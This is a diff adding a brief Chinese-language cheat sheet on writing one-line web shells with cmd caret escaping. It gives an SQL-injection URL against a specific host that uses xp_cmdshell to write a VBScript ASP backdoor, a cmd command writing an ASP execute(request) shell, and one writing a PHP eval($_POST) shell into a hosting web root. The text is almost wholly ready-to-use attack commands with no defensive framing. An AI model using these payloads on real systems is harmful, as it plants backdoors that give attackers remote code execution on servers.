@@ -1,0 +1,9 @@
+用^转义字符来写ASP(一句话木马)文件的方法:
+
+1.注入点后执行 http://192.168.1.5/display.asp?keyno=1881;exec master.dbo.xp_cmdshell 'echo ^<script language=VBScript runat=server^>execute request^("l"^)^</script^> >c:\mu.asp';--
+
+2.CMD下执行 echo ^<%execute^(request^("l"^)^)%^> >D:\doc\week6\images\2.asp
+
+
+PHP
+echo  ^<^?php eval^($_POST[cmd])?^>>D:\hosting\wwwroot\zlhua_cn\htdocs\1.php
